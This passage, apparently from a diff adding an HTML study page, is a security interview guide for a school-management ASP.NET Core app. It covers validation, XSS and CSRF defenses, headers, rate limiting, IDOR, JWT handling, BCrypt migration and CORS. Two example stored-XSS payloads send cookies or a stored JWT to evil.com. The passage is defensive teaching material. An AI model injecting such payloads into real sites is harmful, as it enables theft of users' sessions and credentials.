+            .<span class="mt">Matches</span>(<span class="st">@"^[a-zA-Z\s\.\-']+$"</span>).<span class="mt">WithMessage</span>(<span class="st">"Name contains invalid characters"</span>);
+    }
+}
+
+<span class="cm">// Register globally — auto-validates all controllers</span>
+<span class="pr">builder</span>.<span class="pr">Services</span>.<span class="mt">AddFluentValidationAutoValidation</span>();
+<span class="pr">builder</span>.<span class="pr">Services</span>.<span class="mt">AddValidatorsFromAssemblyContaining</span>&lt;<span class="tp">FeeCollectDtoValidator</span>&gt;();
+<span class="cm">// Returns 400 with validation errors automatically — no [FromBody] manual check needed!</span>
+
+<span class="cm">// NEVER trust input — even from your own DB!</span>
+<span class="cm">// Student name could have been set to malicious value via API bypass
+// Always validate AND encode on output</span></pre>
+</div>
+
+<!-- SECTION 5: XSS + CSRF -->
+<div class="section" id="xss">
+  <div class="section-title"><span class="num">5</span> XSS + CSRF — Output Encoding + Token Protection</div>
+
+  <pre><span class="cm">// XSS (Cross-Site Scripting) — stored XSS in ZenCampus
+// Attack: Student registered with name: &lt;script&gt;fetch('https://evil.com?c='+document.cookie)&lt;/script&gt;
+// When admin views student list in browser → script runs → steals admin's JWT (if in localStorage)!</span>
+
+<span class="cm">// Prevention 1: HTML encode all output in Razor views</span>
+<span class="cm">// Razor auto-encodes @Model.Name  → &lt;script&gt; becomes &amp;lt;script&amp;gt; (safe!)</span>
+&lt;td&gt;@Model.StudentName&lt;/td&gt;    <span class="cm">← SAFE — Razor encodes automatically</span>
+&lt;td&gt;@Html.Raw(Model.StudentName)&lt;/td&gt; <span class="cm">← DANGER — never use Html.Raw on user input!</span>
+
+<span class="cm">// Prevention 2: Content Security Policy header</span>
+<span class="pr">app</span>.<span class="mt">Use</span>(<span class="kw">async</span> (<span class="pr">ctx</span>, <span class="pr">next</span>) =>
+{
+    <span class="pr">ctx</span>.<span class="pr">Response</span>.<span class="pr">Headers</span>.<span class="mt">Append</span>(<span class="st">"Content-Security-Policy"</span>,
+        <span class="st">"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; frame-ancestors 'none';"</span>);
+    <span class="cm">// script-src 'self' = only scripts from same origin allowed
+    // Inline &lt;script&gt; tags BLOCKED by CSP — stored XSS neutralized!</span>
+    <span class="kw">await</span> <span class="mt">next</span>();
+});
+
+<span class="cm">// Prevention 3: Store JWT in httpOnly cookie, NOT localStorage!
+// localStorage: accessible by JS → XSS steals JWT easily
+// httpOnly cookie: JS cannot read it → XSS cannot steal JWT!
+
+// Set JWT as httpOnly cookie</span>
+<span class="pr">Response</span>.<span class="pr">Cookies</span>.<span class="mt">Append</span>(<span class="st">"access_token"</span>, <span class="pr">token</span>, <span class="kw">new</span> <span class="tp">CookieOptions</span>
+{
+    <span class="pr">HttpOnly</span> = <span class="kw">true</span>,   <span class="cm">// JS cannot read this cookie!</span>
+    <span class="pr">Secure</span>   = <span class="kw">true</span>,   <span class="cm">// HTTPS only</span>
+    <span class="pr">SameSite</span> = <span class="tp">SameSiteMode</span>.<span class="pr">Strict</span>,  <span class="cm">// CSRF protection!</span>
+    <span class="pr">Expires</span>  = <span class="tp">DateTimeOffset</span>.<span class="pr">UtcNow</span>.<span class="mt">AddHours</span>(<span class="nm">1</span>)
+});</pre>
+
+  <pre><span class="cm">// CSRF (Cross-Site Request Forgery)
+// Attack: Parent logged into ZenCampus. Evil site sends:
+//   POST https://zencampus.com/api/fees/collect (with parent's cookies!)
+// Browser auto-sends cookies → fee collected from wrong account!
+
+// Prevention 1: SameSite=Strict cookie (above) — blocks cross-site cookie sending
+
+// Prevention 2: AntiForgery token (for MVC forms)</span>
+<span class="cm">// In Razor form:</span>
+&lt;form method="post" action="/fees/collect"&gt;
+    @Html.AntiForgeryToken()  <span class="cm">← hidden input with CSRF token</span>
+    &lt;input type="submit" value="Pay" /&gt;
+&lt;/form&gt;
+
+<span class="cm">// In controller:</span>
+[<span class="at">ValidateAntiForgeryToken</span>]  <span class="cm">// validates token on every POST</span>
+[<span class="at">HttpPost</span>]
+<span class="kw">public</span> <span class="tp">IActionResult</span> <span class="mt">CollectFee</span>(<span class="tp">FeeCollectModel</span> <span class="pr">model</span>) { }
+
+<span class="cm">// Prevention 3: For APIs (no cookies) — use Bearer token in Authorization header
+// CSRF can't forge Authorization header — only cookies are auto-sent by browser!
+// So APIs using Bearer tokens are inherently CSRF-safe (no cookies = no CSRF)</span></pre>
+
+  <pre><span class="cm">// Security Headers — add to all responses</span>
+<span class="pr">app</span>.<span class="mt">Use</span>(<span class="kw">async</span> (<span class="pr">ctx</span>, <span class="pr">next</span>) =>
+{
+    <span class="kw">var</span> <span class="pr">h</span> = <span class="pr">ctx</span>.<span class="pr">Response</span>.<span class="pr">Headers</span>;
+    <span class="pr">h</span>.<span class="mt">Append</span>(<span class="st">"X-Content-Type-Options"</span>,   <span class="st">"nosniff"</span>);        <span class="cm">// no MIME sniffing</span>
+    <span class="pr">h</span>.<span class="mt">Append</span>(<span class="st">"X-Frame-Options"</span>,          <span class="st">"DENY"</span>);            <span class="cm">// no iframes (clickjacking)</span>
+    <span class="pr">h</span>.<span class="mt">Append</span>(<span class="st">"X-XSS-Protection"</span>,         <span class="st">"1; mode=block"</span>);  <span class="cm">// legacy XSS filter</span>
+    <span class="pr">h</span>.<span class="mt">Append</span>(<span class="st">"Referrer-Policy"</span>,          <span class="st">"strict-origin-when-cross-origin"</span>);
+    <span class="pr">h</span>.<span class="mt">Append</span>(<span class="st">"Permissions-Policy"</span>,        <span class="st">"camera=(), microphone=(), geolocation=()"</span>);
+    <span class="kw">await</span> <span class="mt">next</span>();
+});
+
+<span class="cm">// HSTS — force HTTPS for 1 year</span>
+<span class="pr">app</span>.<span class="mt">UseHsts</span>(); <span class="cm">// Strict-Transport-Security: max-age=31536000</span>
+<span class="pr">app</span>.<span class="mt">UseHttpsRedirection</span>(); <span class="cm">// redirect all HTTP → HTTPS</span></pre>
+</div>
+
+<!-- SECTION 6: RATE LIMITING -->
+<div class="section" id="ratelimit">
+  <div class="section-title"><span class="num">6</span> Rate Limiting — Brute Force + DDoS Prevention</div>
+
+  <div class="movie">
+    <span class="film">🎬 Theri — Vijay controls the chaotic crowd methodically. Rate limiting = same. Login endpoint without limit: attacker tries 10,000 passwords in 10 seconds. With limit: 5 attempts per minute, locked for 15 min = brute force blocked!</span>
+  </div>
+
+  <pre><span class="cm">// ASP.NET Core 8 — built-in rate limiting (no 3rd party needed!)
+// NuGet: already in framework</span>
+
+<span class="pr">builder</span>.<span class="pr">Services</span>.<span class="mt">AddRateLimiter</span>(<span class="pr">opts</span> =>
+{
+    <span class="cm">// Fixed window: 5 requests per minute per IP on login</span>
+    <span class="pr">opts</span>.<span class="mt">AddFixedWindowLimiter</span>(<span class="st">"login"</span>, <span class="pr">o</span> =>
+    {
+        <span class="pr">o</span>.<span class="pr">Window</span>           = <span class="tp">TimeSpan</span>.<span class="mt">FromMinutes</span>(<span class="nm">1</span>);
+        <span class="pr">o</span>.<span class="pr">PermitLimit</span>      = <span class="nm">5</span>;              <span class="cm">// 5 attempts per minute</span>
+        <span class="pr">o</span>.<span class="pr">QueueLimit</span>       = <span class="nm">0</span>;              <span class="cm">// no queuing — reject immediately</span>
+        <span class="pr">o</span>.<span class="pr">QueueProcessingOrder</span> = <span class="tp">QueueProcessingOrder</span>.<span class="pr">OldestFirst</span>;
+    });
+
+    <span class="cm">// Sliding window: 100 API calls per minute per user</span>
+    <span class="pr">opts</span>.<span class="mt">AddSlidingWindowLimiter</span>(<span class="st">"api"</span>, <span class="pr">o</span> =>
+    {
+        <span class="pr">o</span>.<span class="pr">Window</span>            = <span class="tp">TimeSpan</span>.<span class="mt">FromMinutes</span>(<span class="nm">1</span>);
+        <span class="pr">o</span>.<span class="pr">SegmentsPerWindow</span> = <span class="nm">6</span>;              <span class="cm">// check every 10 seconds</span>
+        <span class="pr">o</span>.<span class="pr">PermitLimit</span>       = <span class="nm">100</span>;
+    });
+
+    <span class="cm">// Per-user partitioned limiter (different limits per school)</span>
+    <span class="pr">opts</span>.<span class="mt">AddPolicy</span>(<span class="st">"per-school"</span>, <span class="pr">httpCtx</span> =>
+        <span class="tp">RateLimitPartition</span>.<span class="mt">GetFixedWindowLimiter</span>(
+            <span class="pr">partitionKey</span>: <span class="pr">httpCtx</span>.<span class="pr">User</span>.<span class="mt">FindFirst</span>(<span class="st">"schoolId"</span>)?.<span class="pr">Value</span> ?? <span class="st">"anonymous"</span>,
+            <span class="pr">factory</span>: <span class="pr">_</span> => <span class="kw">new</span> <span class="tp">FixedWindowRateLimiterOptions</span>
+            {
+                <span class="pr">Window</span>      = <span class="tp">TimeSpan</span>.<span class="mt">FromMinutes</span>(<span class="nm">1</span>),
+                <span class="pr">PermitLimit</span> = <span class="nm">200</span>  <span class="cm">// 200 requests per school per minute</span>
+            }));
+
+    <span class="cm">// 429 response when limit exceeded</span>
+    <span class="pr">opts</span>.<span class="pr">OnRejected</span> = <span class="kw">async</span> (<span class="pr">ctx</span>, <span class="pr">ct</span>) =>
+    {
+        <span class="pr">ctx</span>.<span class="pr">HttpContext</span>.<span class="pr">Response</span>.<span class="pr">StatusCode</span> = <span class="nm">429</span>;
+        <span class="pr">ctx</span>.<span class="pr">HttpContext</span>.<span class="pr">Response</span>.<span class="pr">Headers</span>.<span class="mt">Append</span>(<span class="st">"Retry-After"</span>, <span class="st">"60"</span>);
+        <span class="kw">await</span> <span class="pr">ctx</span>.<span class="pr">HttpContext</span>.<span class="pr">Response</span>.<span class="mt">WriteAsync</span>(<span class="st">"Too many requests. Try after 60 seconds."</span>, <span class="pr">ct</span>);
+    };
+});
+
+<span class="pr">app</span>.<span class="mt">UseRateLimiter</span>(); <span class="cm">// must be before UseAuthentication!</span>
+
+<span class="cm">// Apply to endpoints</span>
+[<span class="at">EnableRateLimiting</span>(<span class="st">"login"</span>)]
+[<span class="at">HttpPost</span>(<span class="st">"auth/login"</span>)]
+<span class="at">[AllowAnonymous]</span>
+<span class="kw">public async</span> <span class="tp">Task</span>&lt;<span class="tp">IActionResult</span>&gt; <span class="mt">LoginAsync</span>(<span class="tp">LoginDto</span> <span class="pr">dto</span>) { }
+
+[<span class="at">EnableRateLimiting</span>(<span class="st">"api"</span>)]
+[<span class="at">HttpGet</span>(<span class="st">"students"</span>)]
+<span class="kw">public async</span> <span class="tp">Task</span>&lt;<span class="tp">IActionResult</span>&gt; <span class="mt">GetStudentsAsync</span>() { }</pre>
+</div>
+
+<!-- SCENARIOS -->
+<div class="section" id="scenarios">
+  <div class="section-title"><span class="num">7</span> 🎯 Scenarios — Security Interview Questions</div>
+
+  <div class="scenario-card hot">
+    <div class="scenario-header">
+      <div class="s-num crit">1</div>
+      <div><div class="scenario-title">Broken access control — parent accessing other student <span class="hot-badge">🔥 OWASP #1</span> <span class="diff hard">Hard</span></div></div>
+    </div>
+    <div class="scenario-q">📋 <strong>Scenario:</strong> "Parent JWT decoded: role=Parent, userId=50. They call GET /api/students/102 — a student belonging to different parent. What happens without proper authorization? How to fix?"</div>
+    <button class="reveal-btn" onclick="toggle(this)">🔒 Answer Reveal</button>
+    <div class="answer">
+      <div class="a-label crit">⛔ OWASP A01 — Broken Access Control</div>
+      <pre><span class="cm">// WITHOUT fix: [Authorize(Roles="Parent")] only checks role!
+// Parent 50 can access ANY student if they know the ID!
+// IDOR = Insecure Direct Object Reference — classic OWASP A01</span>
+
+<span class="cm">// ATTACK: brute force student IDs:
+// GET /api/students/1  → 200 (not my child but I can see!)
+// GET /api/students/2  → 200
+// GET /api/students/200 → 200 (50,000 students exposed!)</span>
+
+<span class="cm">// FIX: check ownership in EVERY endpoint that accesses student data</span>
+[<span class="at">HttpGet</span>(<span class="st">"students/{studentId}"</span>)]
+[<span class="at">Authorize</span>(<span class="pr">Roles</span> = <span class="st">"Parent"</span>)]
+<span class="kw">public async</span> <span class="tp">Task</span>&lt;<span class="tp">IActionResult</span>&gt; <span class="mt">GetStudent</span>(<span class="kw">int</span> <span class="pr">studentId</span>)
+{
+    <span class="kw">var</span> <span class="pr">parentId</span> = <span class="kw">int</span>.<span class="mt">Parse</span>(<span class="tp">User</span>.<span class="mt">FindFirst</span>(<span class="tp">ClaimTypes</span>.<span class="pr">NameIdentifier</span>)!.<span class="pr">Value</span>);
+
+    <span class="cm">// Non-negotiable ownership check</span>
+    <span class="kw">var</span> <span class="pr">isOwner</span> = <span class="kw">await</span> <span class="pr">_parentRepo</span>.<span class="mt">IsParentOfStudentAsync</span>(<span class="pr">parentId</span>, <span class="pr">studentId</span>);
+    <span class="kw">if</span> (!<span class="pr">isOwner</span>) <span class="kw">return</span> <span class="mt">Forbid</span>(); <span class="cm">// 403 — don't reveal student exists (use 404 if paranoid)</span>
+
+    <span class="kw">return</span> <span class="mt">Ok</span>(<span class="kw">await</span> <span class="pr">_repo</span>.<span class="mt">GetAsync</span>(<span class="pr">studentId</span>));
+}
+
+<span class="cm">// DB query: always filter by schoolId from JWT (never from request body!)
+// Teacher endpoint:</span>
+<span class="kw">var</span> <span class="pr">schoolId</span> = <span class="kw">int</span>.<span class="mt">Parse</span>(<span class="tp">User</span>.<span class="mt">FindFirst</span>(<span class="st">"schoolId"</span>)!.<span class="pr">Value</span>); <span class="cm">// from JWT — TRUSTED</span>
+<span class="kw">var</span> <span class="pr">students</span> = <span class="kw">await</span> <span class="pr">_ctx</span>.<span class="pr">Students</span>
+    .<span class="mt">Where</span>(<span class="pr">s</span> => <span class="pr">s</span>.<span class="pr">SchoolId</span> == <span class="pr">schoolId</span>)  <span class="cm">// always scope by JWT claim — not query param!</span>
+    .<span class="mt">ToListAsync</span>();
+<span class="cm">// Never: WHERE SchoolId = @RequestSchoolId (attacker controls this!)
+// Always: WHERE SchoolId = @JwtSchoolId (you control this!)</span></pre>
+      <div class="gold-box"><div class="gold-label">⭐ Golden Rule</div><p>"Never trust input for authorization. SchoolId in query string = attacker-controlled. SchoolId in JWT claim = server-signed, trustworthy. Always get authorization context from JWT claims, never from request parameters."</p></div>
+    </div>
+  </div>
+
+  <div class="scenario-card hot">
+    <div class="scenario-header">
+      <div class="s-num">2</div>
+      <div><div class="scenario-title">JWT structure — what's in the token, what's safe to put there? <span class="diff medium">Medium</span> <span class="real">Real Interview</span></div></div>
+    </div>
+    <div class="scenario-q">📋 <strong>Scenario:</strong> "Junior developer wants to store student's full address and fee balance in JWT for faster access. Is this a good idea?"</div>
+    <button class="reveal-btn" onclick="toggle(this)">🔒 Answer Reveal</button>
+    <div class="answer">
+      <div class="a-label">⚠️ BAD IDEA — 3 REASONS</div>
+      <pre><span class="cm">// JWT payload is Base64 encoded — NOT encrypted!
+// Anyone can decode it: jwt.io → paste token → see payload!
+
+// Decode this yourself:</span>
+eyJzdWIiOiIxMjMiLCJhZGRyZXNzIjoiMTIzIE1haW4gU3QsIENoZW5uYWkiLCJmZWVCYWxhbmNlIjo1MDAwfQ
+<span class="cm">// → {"sub":"123","address":"123 Main St, Chennai","feeBalance":5000}
+// Student's home address + financial data readable by ANYONE with the token!
+
+// Problem 2: Stale data
+// Fee balance put in token at login: ₹5000
+// Student pays ₹1000 → fee balance ₹4000 in DB
+// Token still says ₹5000 until expiry (1 hour)!
+// UI shows wrong balance. Admin confused.
+
+// Problem 3: Token size → slow HTTP headers
+// Normal JWT: ~500 bytes
+// JWT with full student data: 5KB+ → every HTTP request carries 5KB overhead!
+
+// WHAT TO PUT in JWT (only identity + authorization context):</span>
+<span class="kw">var</span> <span class="pr">claims</span> = <span class="kw">new</span>[]
+{
+    <span class="kw">new</span> <span class="tp">Claim</span>(<span class="tp">ClaimTypes</span>.<span class="pr">NameIdentifier</span>, <span class="pr">user</span>.<span class="pr">Id</span>.<span class="mt">ToString</span>()),  <span class="cm">// ✅ user ID</span>
+    <span class="kw">new</span> <span class="tp">Claim</span>(<span class="tp">ClaimTypes</span>.<span class="pr">Role</span>,             <span class="pr">user</span>.<span class="pr">Role</span>),          <span class="cm">// ✅ role</span>
+    <span class="kw">new</span> <span class="tp">Claim</span>(<span class="st">"schoolId"</span>,                  <span class="pr">user</span>.<span class="pr">SchoolId</span>.<span class="mt">ToString</span>()), <span class="cm">// ✅ tenant scope</span>
+    <span class="cm">// ❌ NEVER: address, phone, fee balance, grade, salary, password</span>
+};
+<span class="cm">// Fetch fresh data from DB/cache per request — don't cache sensitive data in JWT!</span></pre>
+    </div>
+  </div>
+
+  <div class="scenario-card hot">
+    <div class="scenario-header">
+      <div class="s-num crit">3</div>
+      <div><div class="scenario-title">Student name XSS — admin JWT stolen! <span class="hot-badge">🔥 Real Attack Vector</span> <span class="diff hard">Hard</span></div></div>
+    </div>
+    <div class="scenario-q">📋 <strong>Scenario:</strong> "Attacker registers student with name: &lt;img src=x onerror='fetch(\"https://evil.com?c=\"+localStorage.getItem(\"jwt\"))'&gt;. Admin opens student list. What happens and how to prevent?"</div>
+    <button class="reveal-btn" onclick="toggle(this)">🔒 Answer Reveal</button>
+    <div class="answer">
+      <div class="a-label crit">⛔ STORED XSS — MULTI-LAYER DEFENSE</div>
+      <pre><span class="cm">// Attack flow:
+// 1. Attacker registers student, name = malicious HTML/JS
+// 2. Stored in DB as-is
+// 3. Admin opens student list
+// 4. Browser renders img tag → src=x fails → onerror JS executes
+// 5. JS reads JWT from localStorage → sends to evil.com
+// 6. Attacker has admin JWT → full control of ZenCampus!
+
+// Fix Layer 1: Razor auto-encoding (if using MVC/Razor Pages)</span>
+&lt;td&gt;@Model.Name&lt;/td&gt;  <span class="cm">← Razor HTML-encodes: &lt;img becomes &amp;lt;img (SAFE!)</span>
+
+<span class="cm">// Fix Layer 2: For React/Angular/Blazor — frameworks encode by default
+// React: &lt;td&gt;{student.name}&lt;/td&gt; → auto-encoded (SAFE!)
+// DANGER: &lt;td dangerouslySetInnerHTML={{__html: student.name}} /&gt; → XSS!</span>
+
+<span class="cm">// Fix Layer 3: Content Security Policy — inline scripts blocked
+// Even if encoded HTML is wrong, CSP blocks script execution</span>
+Content-Security-Policy: script-src 'self';  <span class="cm">// no inline scripts allowed!</span>
+
+<span class="cm">// Fix Layer 4: Store JWT in httpOnly cookie (XSS can't steal it!)
+// localStorage.getItem("jwt") → attackers go-to
+// httpOnly cookie → JS can't access → attack fails even if XSS executes!</span>
+
+<span class="cm">// Fix Layer 5: Input validation on save (belt + suspenders)
+// Reject names with HTML characters at API level</span>
+<span class="mt">RuleFor</span>(<span class="pr">x</span> => <span class="pr">x</span>.<span class="pr">Name</span>)
+    .<span class="mt">Matches</span>(<span class="st">@"^[a-zA-Z\s\.\-']+$"</span>)  <span class="cm">// only letters, spaces, dots, hyphens, apostrophes</span>
+    .<span class="mt">WithMessage</span>(<span class="st">"Name contains invalid characters"</span>);
+<span class="cm">// Defense in depth: validate input + encode output + CSP + httpOnly cookie</span></pre>
+    </div>
+  </div>
+
+  <div class="scenario-card">
+    <div class="scenario-header">
+      <div class="s-num">4</div>
+      <div><div class="scenario-title">Rate limiting — brute force on login endpoint <span class="diff medium">Medium</span> <span class="real">Real Interview</span></div></div>
+    </div>
+    <div class="scenario-q">📋 <strong>Scenario:</strong> "ZenCampus admin password is weak. Attacker runs dictionary attack — 10,000 password attempts per second on /api/auth/login. How to detect and prevent?"</div>
+    <button class="reveal-btn" onclick="toggle(this)">🔒 Answer Reveal</button>
+    <div class="answer">
+      <div class="a-label">✅ MULTI-LAYER BRUTE FORCE PROTECTION</div>
+      <pre><span class="cm">// Layer 1: ASP.NET Core Rate Limiting (5 per minute per IP)</span>
+[<span class="at">EnableRateLimiting</span>(<span class="st">"login"</span>)]   <span class="cm">// 5 requests/min — 429 after that!</span>
+[<span class="at">HttpPost</span>(<span class="st">"auth/login"</span>)]
+
+<span class="cm">// Layer 2: Account lockout after N failed attempts</span>
+<span class="kw">var</span> <span class="pr">user</span> = <span class="kw">await</span> <span class="pr">_userManager</span>.<span class="mt">FindByEmailAsync</span>(<span class="pr">dto</span>.<span class="pr">Email</span>);
+<span class="kw">var</span> <span class="pr">result</span> = <span class="kw">await</span> <span class="pr">_signInManager</span>.<span class="mt">CheckPasswordSignInAsync</span>(
+    <span class="pr">user</span>, <span class="pr">dto</span>.<span class="pr">Password</span>,
+    <span class="pr">lockoutOnFailure</span>: <span class="kw">true</span>);  <span class="cm">// after 5 failures: locked 15 minutes!</span>
+
+<span class="kw">if</span> (<span class="pr">result</span>.<span class="pr">IsLockedOut</span>)
+    <span class="kw">return</span> <span class="mt">StatusCode</span>(<span class="nm">423</span>, <span class="st">"Account locked for 15 minutes"</span>);
+
+<span class="cm">// Layer 3: Constant-time password comparison (prevent timing attacks)</span>
+<span class="cm">// BCrypt.Verify() is already constant-time — don't use string.Compare!</span>
+<span class="kw">var</span> <span class="pr">isValid</span> = <span class="tp">BCrypt</span>.<span class="pr">Net</span>.<span class="tp">BCrypt</span>.<span class="mt">Verify</span>(<span class="pr">dto</span>.<span class="pr">Password</span>, <span class="pr">user</span>.<span class="pr">PasswordHash</span>);
+
+<span class="cm">// Layer 4: Never reveal which is wrong — email or password</span>
+<span class="kw">if</span> (<span class="pr">user</span> <span class="kw">is null</span> || !<span class="pr">isValid</span>)
+    <span class="kw">return</span> <span class="mt">Unauthorized</span>(<span class="st">"Invalid credentials"</span>); <span class="cm">// same message for both!</span>
+<span class="cm">// NOT: "Email not found" / "Wrong password" — attacker learns which part is correct!</span>
+
+<span class="cm">// Layer 5: Azure AD B2C or Captcha for internet-facing login
+// Layer 6: App Insights alert: > 50 failed logins/minute for same IP</span></pre>
+    </div>
+  </div>
+
+  <div class="scenario-card">
+    <div class="scenario-header">
+      <div class="s-num">5</div>
+      <div><div class="scenario-title">Password hashing — developer used MD5! <span class="diff medium">Medium</span></div></div>
+    </div>
+    <div class="scenario-q">📋 <strong>Scenario:</strong> "Legacy ZenCampus stores passwords as MD5 hashes. Security audit found this. What's wrong and how to migrate to BCrypt?"</div>
+    <button class="reveal-btn" onclick="toggle(this)">🔒 Answer Reveal</button>
+    <div class="answer">
+      <div class="a-label">✅ BCRYPT MIGRATION — SAFE TRANSITION</div>
+      <pre><span class="cm">// Why MD5 is BAD for passwords:
+// 1. Fast: GPU can crack 10 BILLION MD5/second
+// 2. Rainbow tables: precomputed hash → password in seconds
+// 3. No salt: same password = same hash (identifies duplicates)
+// MD5("password123") = 482c811da5d5b4bc6d497ffa98491e38 → cracked in 0.01ms!
+
+// BCrypt advantages:
+// 1. Adaptive cost factor (work factor) — intentionally slow
+// 2. Built-in salt — same password → different hash every time
+// 3. Cost 12 = ~250ms to hash — 250ms × 10B guesses = 793 years!
+// NuGet: BCrypt.Net-Next</span>
+
+<span class="kw">var</span> <span class="pr">hash</span> = <span class="tp">BCrypt</span>.<span class="pr">Net</span>.<span class="tp">BCrypt</span>.<span class="mt">HashPassword</span>(<span class="pr">password</span>, <span class="pr">workFactor</span>: <span class="nm">12</span>);
+<span class="cm">// $2a$12$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
+//  ↑   ↑                                               ↑ 22-char salt embedded!</span>
+
+<span class="kw">var</span> <span class="pr">isValid</span> = <span class="tp">BCrypt</span>.<span class="pr">Net</span>.<span class="tp">BCrypt</span>.<span class="mt">Verify</span>(<span class="pr">plaintext</span>, <span class="pr">hash</span>);
+
+<span class="cm">// Safe migration — NO forced password reset needed!
+// 1. Add column: PasswordHashBcrypt (nullable)
+// 2. On login: if BCrypt column null, verify MD5, re-hash with BCrypt, store BCrypt
+// 3. After 30 days: force-reset remaining MD5 users (never logged in)
+// 4. Remove MD5 column</span>
+<span class="kw">public async</span> <span class="tp">Task</span>&lt;<span class="tp">LoginResponse</span>?&gt; <span class="mt">LoginAsync</span>(<span class="kw">string</span> <span class="pr">email</span>, <span class="kw">string</span> <span class="pr">password</span>)
+{
+    <span class="kw">var</span> <span class="pr">user</span> = <span class="kw">await</span> <span class="pr">_repo</span>.<span class="mt">GetByEmailAsync</span>(<span class="pr">email</span>);
+    <span class="kw">if</span> (<span class="pr">user</span> <span class="kw">is null</span>) <span class="kw">return null</span>;
+
+    <span class="kw">bool</span> <span class="pr">valid</span>;
+    <span class="kw">if</span> (<span class="pr">user</span>.<span class="pr">PasswordHashBcrypt</span> <span class="kw">is not null</span>)
+    {
+        <span class="pr">valid</span> = <span class="tp">BCrypt</span>.<span class="pr">Net</span>.<span class="tp">BCrypt</span>.<span class="mt">Verify</span>(<span class="pr">password</span>, <span class="pr">user</span>.<span class="pr">PasswordHashBcrypt</span>);
+    }
+    <span class="kw">else</span>
+    {
+        <span class="kw">var</span> <span class="pr">md5Hash</span> = <span class="mt">ComputeMd5</span>(<span class="pr">password</span>);
+        <span class="pr">valid</span> = <span class="pr">md5Hash</span> == <span class="pr">user</span>.<span class="pr">PasswordHashMd5</span>;
+        <span class="kw">if</span> (<span class="pr">valid</span>)  <span class="cm">// upgrade on login!</span>
+        {
+            <span class="pr">user</span>.<span class="pr">PasswordHashBcrypt</span> = <span class="tp">BCrypt</span>.<span class="pr">Net</span>.<span class="tp">BCrypt</span>.<span class="mt">HashPassword</span>(<span class="pr">password</span>, <span class="nm">12</span>);
+            <span class="kw">await</span> <span class="pr">_repo</span>.<span class="mt">UpdateAsync</span>(<span class="pr">user</span>);
+        }
+    }
+    <span class="kw">return</span> <span class="pr">valid</span> ? <span class="pr">_jwtService</span>.<span class="mt">GenerateTokens</span>(<span class="pr">user</span>) : <span class="kw">null</span>;
+}</pre>
+    </div>
+  </div>
+
+  <div class="scenario-card">
+    <div class="scenario-header">
+      <div class="s-num">6</div>
+      <div><div class="scenario-title">Swagger in production — information disclosure <span class="diff easy">Easy</span></div></div>
+    </div>
+    <div class="scenario-q">📋 <strong>Scenario:</strong> "ZenCampus production server has Swagger UI accessible at /swagger. Security tester flagged this. Why is it a risk and how to fix?"</div>
+    <button class="reveal-btn" onclick="toggle(this)">🔒 Answer Reveal</button>
+    <div class="answer">
+      <div class="a-label">✅ ENVIRONMENT-GATED SWAGGER</div>
+      <pre><span class="cm">// Risk: Swagger in production reveals:
+// - All API endpoints (attack surface mapping)
+// - Request/response schemas (data structure)
+// - Parameter names (targeted injection attacks)
+// - Authentication requirements (which endpoints are unprotected)
+// - Error messages (stack traces, internal paths)</span>
+
+<span class="cm">// Fix: only enable Swagger in Development</span>
+<span class="kw">if</span> (<span class="pr">app</span>.<span class="pr">Environment</span>.<span class="mt">IsDevelopment</span>())
+{
+    <span class="pr">app</span>.<span class="mt">UseSwagger</span>();
+    <span class="pr">app</span>.<span class="mt">UseSwaggerUI</span>(<span class="pr">opts</span> => {
+        <span class="pr">opts</span>.<span class="pr">SwaggerEndpoint</span>(<span class="st">"/swagger/v1/swagger.json"</span>, <span class="st">"ZenCampus API v1"</span>);
+        <span class="pr">opts</span>.<span class="mt">DefaultModelsExpandDepth</span>(-<span class="nm">1</span>); <span class="cm">// collapse models by default</span>
+    });
+}
+<span class="cm">// In production: 404 for /swagger → attacker learns nothing</span>
+
+<span class="cm">// Also disable in production:
+// - Developer exception page (shows stack traces)
+// - Detailed error messages
+// - Debug endpoints (/debug, /health/detailed)</span>
+<span class="kw">if</span> (!<span class="pr">app</span>.<span class="pr">Environment</span>.<span class="mt">IsDevelopment</span>())
+{
+    <span class="pr">app</span>.<span class="mt">UseExceptionHandler</span>(<span class="st">"/error"</span>);  <span class="cm">// generic error page, no stack trace</span>
+    <span class="pr">app</span>.<span class="mt">UseHsts</span>();
+}</pre>
+    </div>
+  </div>
+
+  <div class="scenario-card">
+    <div class="scenario-header">
+      <div class="s-num">7</div>
+      <div><div class="scenario-title">CORS misconfiguration — credentials leak <span class="diff medium">Medium</span></div></div>
+    </div>
+    <div class="scenario-q">📋 <strong>Scenario:</strong> "Developer set CORS to AllowAnyOrigin() + AllowCredentials() in production. Security tester says this is dangerous. Why?"</div>
+    <button class="reveal-btn" onclick="toggle(this)">🔒 Answer Reveal</button>
+    <div class="answer">
+      <div class="a-label">✅ CORS — SPECIFIC ORIGINS ONLY</div>
+      <pre><span class="cm">// INVALID COMBINATION — browser rejects it anyway:
+// AllowAnyOrigin() + AllowCredentials() = browser ERROR
+// "Cannot use wildcard origin with credentials"
+// But developer might have used: AllowOrigin("*") manually → INSECURE!</span>
+
+<span class="cm">// DANGEROUS: AllowAnyOrigin allows ANY website to make authenticated requests!
+// evil.com can make AJAX requests to zencampus.com/api with user's cookies → data theft</span>
+
+<span class="cm">// CORRECT: specific origins only</span>
+<span class="pr">builder</span>.<span class="pr">Services</span>.<span class="mt">AddCors</span>(<span class="pr">opts</span> => <span class="pr">opts</span>.<span class="mt">AddPolicy</span>(<span class="st">"ZenCampusPolicy"</span>, <span class="pr">policy</span> =>
+{
+    <span class="pr">policy</span>
+        .<span class="mt">WithOrigins</span>(
+            <span class="st">"https://zencampus.com"</span>,          <span class="cm">// ✅ production</span>
+            <span class="st">"https://app.zencampus.com"</span>,       <span class="cm">// ✅ app subdomain</span>
+            <span class="st">"https://localhost:5173"</span>)          <span class="cm">// ✅ local dev only — still explicit!</span>
+        .<span class="mt">AllowAnyMethod</span>()
+        .<span class="mt">AllowAnyHeader</span>()
+        .<span class="mt">AllowCredentials();  <span class="cm">// now safe — only listed origins!</span></span>
+}));
+<span class="cm">// Load allowed origins from config: appsettings.Production.json → Key Vault</span></pre>
+    </div>
+  </div>
+
+  <div class="scenario-card">
+    <div class="scenario-header">
+      <div class="s-num">8</div>
+      <div><div class="scenario-title">Refresh token theft — detect and revoke <span class="diff hard">Hard</span></div></div>
+    </div>
+    <div class="scenario-q">📋 <strong>Scenario:</strong> "Attacker somehow gets parent's refresh token (phishing, XSS, device theft). How does refresh token rotation detect this and protect the account?"</div>
